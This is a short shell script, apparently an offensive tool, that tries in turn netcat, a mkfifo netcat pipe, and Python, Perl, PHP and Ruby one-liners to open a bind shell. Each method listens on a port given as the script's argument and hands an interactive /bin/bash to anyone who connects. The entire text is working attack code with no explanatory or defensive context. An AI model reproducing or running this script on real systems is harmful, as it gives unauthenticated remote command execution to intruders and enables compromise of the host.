echo "**starting**"
{
	 echo "Method: netcat" && nc -lvp $1 -e /bin/bash
} || {
	echo "Method: alt netcat" && rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp $1 >/tmp/f
} || {
	echo "Method: python" && python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('',"$1"));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call(['/bin/bash','-i'])"
} || {
	echo "Method: perl" && perl -e 'use Socket;$p='$1';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'
} || {
	echo "Method: php" && 	php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",'$1');socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'
} || {
	echo "Method: ruby" && 	ruby -rsocket -e 'f=TCPServer.new('$1');s=f.accept;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",s,s,s)'
} || {
	echo "All methods failed"
}